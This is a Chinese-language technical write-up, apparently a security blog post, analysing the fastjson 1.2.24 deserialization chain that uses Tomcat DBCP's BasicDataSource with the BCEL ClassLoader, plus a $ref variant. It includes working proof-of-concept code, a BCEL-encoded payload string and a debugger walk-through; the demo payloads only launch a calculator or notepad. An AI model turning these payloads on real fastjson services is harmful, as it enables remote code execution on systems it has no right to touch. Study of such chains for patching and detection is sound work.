# fastjsonBasicDataSource分析

## 0x01 BCEL

### 1.1 BCEL 简单介绍

​	BCEL的全名应该是Apache Commons BCEL，属于Apache Commons项目下的一个子项目，BCEL库提供了一系列用于分析、创建、修改Java Class文件的API。就这个库的功能来看，其使用面远不及同胞兄弟们，但是他比Commons Collections特殊的一点是，它被包含在了原生的JDK中，位于`com.sun.org.apache.bcel`

​	详细了解：https://www.leavesongs.com/PENETRATION/where-is-bcel-classloader.html

### 1.2 BCEL 简单使用

​	BCEL这个包中有个类`com.sun.org.apache.bcel.internal.util.ClassLoader`，他是一个ClassLoader，但是他重写了Java内置的`ClassLoader#loadClass()`方法。 在`ClassLoader#loadClass()`中，其会判断类名是否是`$$BCEL$$`开头，如果是的话，将会对这个字符串进行decode。可以理解为是传统字节码的HEX编码，再将反斜线替换成`$`，默认情况下外层还会加一层GZip压缩。

写一个可执行的类：

**Evil.java**

```java
package com.BCEL.demo;

public class Evil {
    static {
        try {
            Runtime.getRuntime().exec("open -a calculator");
        }catch (Exception e){}
    }
}

```

​	然后使用过BCEL提供的两个类`Repository` 和 `Utility` 来利用：

-  `Repository`用于将一个`Java Class`先转换成原生字节码，当然这里也可以直接使用javac命令来编译java文件生成字节码；
-  `Utility`用于将原生的字节码转换成BCEL格式的字节码

```java
package com.BCEL.demo;

import com.sun.org.apache.bcel.internal.Repository;
import com.sun.org.apache.bcel.internal.classfile.JavaClass;
import com.sun.org.apache.bcel.internal.classfile.Utility;
import com.sun.org.apache.bcel.internal.util.ClassLoader;

import java.io.IOException;

public class BCEL {
    public static void main(String[] args) throws IOException, ClassNotFoundException, InstantiationException, IllegalAccessException {
        JavaClass javaClass = Repository.lookupClass(Evil.class);
        String encode = Utility.encode(javaClass.getBytes(), true);
        System.out.println(encode);
        //Class.forName("$$BCEL$$" + encode, true, new ClassLoader());
        new ClassLoader().loadClass("$$BCEL$$" + encode).newInstance();
    }
}

```

执行效果如下：

![image-20220329094324029](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-014324.png)

## 0x02 Java类加载器 ClassLoader

​	我们通常会把编程语言的处理器分为`解释器`和`编译器`。解释器是一种用于执行程序的软件，它会根据程序代码中的算法执行运算，如果这个执行软件是根据虚拟的或者类似机器语言的程序设计语言写成，那也称为虚拟机。编译器则是将某种语言代码转换为另外一种语言的程序，通常会转换为机器语言。

有些编程语言会混用解释器和编译器，比如Java会先通过编译器将源代码转换为Java二进制代码（字节码），并将这种虚拟的机器语言保存在文件中（通常是.class文件），之后通过Java虚拟机（JVM）的解释器来执行这段代码。

​	Java是面向对象的语言，字节码中包含了很多Class信息。在 JVM 解释执行的过程中，ClassLoader就是用来加载Java类的，它会将Java字节码中的Class加载到内存中。而每个 Class 对象的内部都有一个 classLoader 属性来标识自己是由哪个 ClassLoader 加载的。

ClassLoader类位于java.lang.ClassLoader，官方描述是这样的：

```java
/**
 * A class loader is an object that is responsible for loading classes. The
 * class <tt>ClassLoader</tt> is an abstract class.  Given the <a
 * href="#name">binary name</a> of a class, a class loader should attempt to
 * locate or generate data that constitutes a definition for the class.  A
 * typical strategy is to transform the name into a file name and then read a
 * "class file" of that name from a file system.
 *
 * ...
 *
 * <p> The <tt>ClassLoader</tt> class uses a delegation model to search for
 * classes and resources.  Each instance of <tt>ClassLoader</tt> has an
 * associated parent class loader.  When requested to find a class or
 * resource, a <tt>ClassLoader</tt> instance will delegate the search for the
 * class or resource to its parent class loader before attempting to find the
 * class or resource itself.  The virtual machine's built-in class loader,
 * called the "bootstrap class loader", does not itself have a parent but may
 * serve as the parent of a <tt>ClassLoader</tt> instance.
 *
 * ...
 **/
public abstract class ClassLoader {
	...
}
```

### 2.1 常见的ClassLoader

JDK内置常见的ClassLoader主要有这几个：

**BootstrapClassLoader、ExtensionClassLoader、AppClassLoader、URLClassLoader、ContextClassLoader。**

ClassLoader采用了委派模式（Parents Delegation Model）来搜索类和资源。每一个ClassLoader类的实例都有一个父级ClassLoader，当需要加载类时，ClassLoader实例会委派父级ClassLoader先进行加载，如果无法加载再自行加载。JVM 内置的 BootstrapClassLoader 自身没有父级ClassLoader，而它可以作为其他ClassLoader实例的父级。

- BootstrapClassLoader，启动类加载器/根加载器，负责加载 JVM 运行时核心类，这些类位于 JAVA_HOME/lib/rt.jar 文件中，我们常用内置库 java.*.* 都在里面。这个 ClassLoader 比较特殊，它其实不是一个ClassLoader实例对象，而是由C代码实现。用户在实现自定义类加载器时，如果需要把加载请求委派给启动类加载器，那可以直接传入null作为 BootstrapClassLoader。
- ExtClassLoader，扩展类加载器，负责加载 JVM 扩展类，扩展 jar 包位于 JAVA_HOME/lib/ext/*.jar 中，库名通常以 javax 开头。
- AppClassLoader，应用类加载器/系统类加载器，直接提供给用户使用的ClassLoader，它会加载 ClASSPATH 环境变量或者 java.class.path 属性里定义的路径中的 jar 包和目录，负责加载包括开发者代码中、第三方库中的类。
- URLClassLoader，ClassLoader抽象类的一种实现，它可以根据URL搜索类或资源，并进行远程加载。BootstrapClassLoader、ExtClassLoader、AppClassLoader等都是 URLClassLoader 的子类。

AppClassLoader 可以由 ClassLoader 类提供的静态方法 getSystemClassLoader() 得到，开发者编写代码中的类就是通过AppClassLoader进行加载的，包括 main() 方法中的第一个用户类。

我们可以运行如下代码查看ClassLoader的委派关系：

> ClassLoader.getParent() 可以获取用于委派的父级class loader，通常会返回null来表示bootstrap class loader。

```java
public class JavaClassLoader {

    public static void main(String[] args) {
        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();
        ClassLoader extensionClassloader = appClassloader.getParent();
        System.out.println("AppClassLoader is " + appClassloader);
        System.out.println("The parent of AppClassLoader is " + extensionClassloader);
        System.out.println("The parent of ExtensionClassLoader is " + extensionClassloader.getParent());
    }
}
```

结果：

```java
AppClassLoader is sun.misc.Launcher$AppClassLoader@18b4aac2
The parent of AppClassLoader is sun.misc.Launcher$ExtClassLoader@5e2de80c
The parent of ExtensionClassLoader is null
```

​	而 ExtensionClassLoader 和 AppClassLoader 都是 URLClassLoader 的子类，它们都是从本地文件系统里加载类库。URLClassLoader 不但可以加载远程类库，还可以加载本地路径的类库，取决于构造器中不同的地址形式。

​	ExtClassLoader 和 AppClassLoader 类的实现代码位于rt.jar 中的 sun.misc.Launcher 类中，Launcher是由BootstrapClassLoader加载的。ExtClassLoader 和 AppClassLoader 定义如下：

```java
static class ExtClassLoader extends URLClassLoader {
	private static volatile Launcher.ExtClassLoader instance;

	public static Launcher.ExtClassLoader getExtClassLoader() throws IOException {
    if (instance == null) {
        Class var0 = Launcher.ExtClassLoader.class;
        synchronized(Launcher.ExtClassLoader.class) {
            if (instance == null) {
                instance = createExtClassLoader();
            }
        }
    }

    return instance;
}

...

static class AppClassLoader extends URLClassLoader {
	final URLClassPath ucp = SharedSecrets.getJavaNetAccess().getURLClassPath(this);

	public static ClassLoader getAppClassLoader(final ClassLoader var0) throws IOException {
    final String var1 = System.getProperty("java.class.path");
    final File[] var2 = var1 == null ? new File[0] : Launcher.getClassPath(var1);
    return (ClassLoader)AccessController.doPrivileged(
    	new PrivilegedAction<Launcher.AppClassLoader>() {
        public Launcher.AppClassLoader run() {
            URL[] var1x = var1 == null ? new URL[0] : Launcher.pathToURLs(var2);
            return new Launcher.AppClassLoader(var1x, var0);
        }
    });
}
```

### 2.2 loadClass()、findClass()、defineClass()

ClassLoader 中有几个重要的方法：loadClass()、findClass()、defineClass()。ClassLoader 尝试定位或者产生一个Class的数据，通常是把二进制名字转换成文件名然后到文件系统中找到该文件。

- loadClass(String classname)，参数为需要加载的全限定类名，该方法会先查看目标类是否已经被加载，查看父级加载器并递归调用loadClass()，如果都没找到则调用findClass()。
- findClass()，搜索类的位置，一般会根据名称或位置加载.class字节码文件，获取字节码数组，然后调用defineClass()。
- defineClass()，将字节码转换为 JVM 的 java.lang.Class 对象。

### 2.3 Class.forName()

​	Class.forName() 也可以用来动态加载指定的类，它会返回一个指定类/接口的 Class 对象，如果没有指定ClassLoader， 那么它会使用BootstrapClassLoader来进行类的加载。

​	Class.forName() 和 ClassLoader.loadClass() 这两个方法都可以用来加载目标类，但是都不支持加载原生类型，比如：int。Class.forName() 可以加载数组，而 ClassLoader.loadClass() 不能。

```java
// 动态加载 int 数组

Class ia = Class.forName("[I");
System.out.println(ia);

// 会输出：
// class [I

Class ia2 =  ClassLoader.getSystemClassLoader().loadClass("[I"); 

// 数组类型不能使用ClassLoader.loadClass方法，会报错：
// Exception in thread "main" java.lang.ClassNotFoundException: [I
```

​	Class.forName()方法实际上也是调用的 CLassLoader 来实现的，调用时也可以在参数中明确指定ClassLoader。与ClassLoader.loadClass() 一个小小的区别是，forName() 默认会对类进行初始化，会执行类中的 static 代码块。而ClassLoader.loadClass() 默认并不会对类进行初始化，只是把类加载到了 JVM 虚拟机中。

我们执行如下测试代码：

```java
class Test{

    static{
        System.out.println("// This is static code executed");
    }
}

public class JavaClassLoader {

    public static void main(String[] args) throws ClassNotFoundException {
        ClassLoader appClassloader = ClassLoader.getSystemClassLoader();      
        System.out.println("Execute Class.forName:");
        Class cl = Class.forName("Test");
        System.out.println(cl);
        System.out.println("Execute ClassLoader:");
        Class cl2 = appClassloader.loadClass("Test");
        System.out.println(cl2);

    }
}
```

执行结果如下，可以看到Class.forName()时，static代码块被执行了：

```java
Execute Class.forName:
// This is static code executed
class Test
Execute ClassLoader:
class Test

```

## 0x03 BCEL在FastJson中的使用

### 3.1 测试环境

Jdk: 8.131

pom.xml

```xml
    <dependency>
        <groupId>com.alibaba</groupId>
        <artifactId>fastjson</artifactId>
        <version>1.2.24</version>
    </dependency>
    <dependency>
        <groupId>org.apache.tomcat</groupId>
        <artifactId>tomcat-dbcp</artifactId>
        <version>9.0.20</version>
    </dependency>
```

### 3.2 Poc

```java
package com.BCEL.demo;

import com.alibaba.fastjson.JSON;

public class POc {
    public static void main(String[] args) {
             //这里是tomcat>8的poc :org.apache.tomcat.dbcp.dbcp2.BasicDataSource
            // 如果小于8的话用到的类是 :org.apache.tomcat.dbcp.dbcp.BasicDataSource
        String payload =
                "{\n"
                        + "   {\n"
                        + "       \"aaa\": {\n"
                        + "               \"@type\": \"org.apache.tomcat.dbcp.dbcp2.BasicDataSource\",\n"
                        + "               \"driverClassLoader\": {\n"
                        + "                   \"@type\": \"com.sun.org.apache.bcel.internal.util.ClassLoader\"\n"
                        + "               },\n"
                        + "               \"driverClassName\": \"$$BCEL$$$l$8b$I$A$A$A$A$A$A$AePMO$C1$Q$7d$85$95$85u$B$F$fc$fe$c2$93h$a2$7b$f1$86$f1$a0$c1$8b$ebG$c4$e8$b9$94$G$8b$cb$96$y$c5$f8$8f$3c$7bQ$e3$c1$l$e0$8f2NW$a3$s6$e9L$e6$cd$7bo$a6$7d$ffx$7d$D$b0$8bu$P$$j$kf0$9b$c7$9c$cd$f3$$$W$5c$y$baXb$c8$ed$a9X$99$7d$86lc$f3$8a$c19$d4$5d$c9P$OU$yO$c7$83$8eL$$y$t$o$a4$Sj$c1$a3$x$9e$u$5b$7f$83$8e$b9Q$p$86Z$u$f4$m88l$85AW$Ot$d0$baSQ$93$n$bf$t$a2o$f3b$dbpq$7b$c2$87$a9$90$c63xm$3dN$84$3cR$d6$a8$60$r$3b$7d$7e$c7$7d$e4Qp$b1$ecc$F$ab4V$Pe$5c$df$e6u$g$$$c6$R7$3a$f1$b1$86$3aC$d5$b2$83$88$c7$bd$a0u$_$e4$d0$u$j$T$ff$ff$s$MS$bf$d4$b3N_$K$c30$fd$L$5d$8cc$a3$G$b4$84$d7$93$e6$a7$98il$86$ff8$f4$uG$deK$c1$b0$d1$f8$d3m$9bD$c5$bd$e6_$c1y$a2$85$i$8d$9aXG$8e$be$df$9e$M$98$7d$hE$8f$aa$802$a3$3c$b1$f5$M$f6$98$b6$t$v$e6R0$L$9f$a2$ffE$40$R$r$cay$94$7f$c4$c7$a9$ZPzA$a6$92$7d$82s$fd$A$e7$f81$c5$K$a4$9b$m$H$ebV$a2l$3d$L$b4B1$ed$d89$c0$U$5d$X$99$d0$c54HTI$e1$ea$t$Y$fc$8f$F2$C$A$A\"\n"
                        + "       }\n"
                        + "   }:\"xxx\"\n"
                        + "}";
        JSON.parse(payload);
    }
}
```

### 3.3 org.apache.tomcat.dbcp.dbcp2.BasicDataSource 分析

​	如果在解析payload这里下断，会在fastjson的流程走很长一段，不是分析的目的。![image-20220329095440531](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-015441.png)

​	所以找到`org.apache.tomcat.dbcp.dbcp2.BasicDataSource`这个类，在`getConnection`z这个方法下断开始分析：

![image-20220329095725002](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-015725.png)

在Poc里Debug，在这里就直接断下来了：

`getConnect`:获取与数据库的连接

![image-20220329100030618](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-020031.png)

走一步，走到`createDataSource`方法，然后跟进：

![image-20220329100732981](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-020733.png)

走到这一步发现，会有一个判断`dataSource`是否为null，这里结果肯定返回了null，所以往下走到了`createConnectionFactory`方法：

![image-20220329100923758](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-020923.png)

进入`createConnectionFactory`方法，首先会获取`classloader`,如果`classloader`不为null，则通过反射执行恶意代码：

![image-20220329103432337](../../Library/Application%20Support/typora-user-images/image-20220329103432337.png)

![image-20220329104513574](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-024514.png)

​	可以看到这里是`Class.forName`将类加载进来，并且设置了`initialize`参数为true【其实就是告诉Java虚拟机是否执⾏”类初始化而staic就是在类初始化加载的】而`Class.forName`方法实际上也是调用的`CLassLoader` 来实现的。所以1和3都是可控的，这里`ClassLoader`会直接从`classname`中提取Class的字节码。那么我们可以设置`driverClassLoader`为`com.sun.org.apache.bcel.internal.util.ClassLoader`,设置`driverClassName为恶意的BCEL格式的字节码。	

​	所以整个调用链：

```
BasicDataSource.getConnection() -> createDataSource() -> createConnectionFactory()
```

### 3.4 getConnection

​	那么fastsjon如何调用`BaseDataSource`的`getConnection`方法呢？

​	<u>FastJson中的 parse() 和 parseObject()方法都可以用来将JSON字符串反序列化成Java对象，parseObject() 本质上也是调用 parse() 进行反序列化的。但是 parseObject() 会额外的将Java对象转为 JSONObject对象，即 JSON.toJSON()。所以进行反序列化时的细节区别在于，parse() 会识别并调用目标类的 setter 方法及某些特定条件的 getter 方法，而 parseObject() 由于多执行了 JSON.toJSON(obj)，所以在处理过程中会调用反序列化目标类的所有 setter 和 getter 方法</u>

​	很显然的是`getConnection`方法是不符合的，返回值类型为`Connection`。所以正常来说在 FastJson 反序列化的过程中并不会被调用。

### 3.5 通过JSONObject调用(fastjson<=1.2.36)

在看这个Poc：

![image-20220329144256830](../../Library/Application%20Support/typora-user-images/image-20220329144256830.png)

​	这个POC利用了`JSONObject#toString`方法来执行了`getConnection`方法。具体如下。

​	首先在`{“@type”: “org.apache.tomcat.dbcp.dbcp2.BasicDataSource”……}` 这一整段外面再套一层`{}`，这样的话会把这个整体当做一个JSONObject，会把这个当做key，值为xxx。

![image-20220329145941732](../../Library/Application%20Support/typora-user-images/image-20220329145941732.png)

​	key为`JSONObject`对象，会调用该对象的toString方法。而且JSONObject是Map的子类，当调用`toString`的时候，会依次调用该类的getter方法获取值。然后会以字符串的形式输出出来。所以会调用到`getConnection`方法

### 3.6 FastJson版本问题

​	此利用链只能应用于`fastjson<=1.2.36`，在1.2.37版本中，直接去掉了`key.toString`方法。

![image-20220329152755231](http://imagesolo.oss-cn-beijing.aliyuncs.com/2022-03-29-072755.png)

### 3.7 通过$ref进行调用（fastjson>=1.2.36）

#### ref

ref是fastjson特有的JSONPath语法，用来引用之前出现的对象

#### JSONPath

fastjson支持JSONPath语法

详细：https://blog.csdn.net/itguangit/article/details/78764212

User.java

```java
package com.ref.demo;

import java.io.IOException;

public class User {
    private String cmd;
    private String test;

    public String getTest() {
        return test;
    }

    public void setTest(String test) {
        this.test = test;
    }

    public String getCmd() throws IOException {
        Runtime.getRuntime().exec(cmd);
        return cmd;
    }

    public void setCmd(String cmd) {
        this.cmd = cmd;
    }
}
```

Poc.java

```java
package com.ref.demo;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;

public class Poc {
    public static void main(String[] args) {
        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
        String payload =
                "[{\"@type\":\"com.ref.demo.User\",\"cmd\":\"calc.exe\"},{\"@type\":\"com.ref.demo.User\",\"cmd\":\"notepad.exe\",\"test\":\"test\"},{\"$ref\":\"$[1].cmd\"}]";

        Object o = JSON.parse(payload);
    }
}
```

## 参考

**如何调用getConnection：https://jlkl.github.io/2021/12/18/Java_07/**

$ref详解：https://paper.seebug.org/1613/

fastjson ref利用：https://blog.csdn.net/solitudi/article/details/120275526

**fastjon中BasicDataSource的利用：https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html**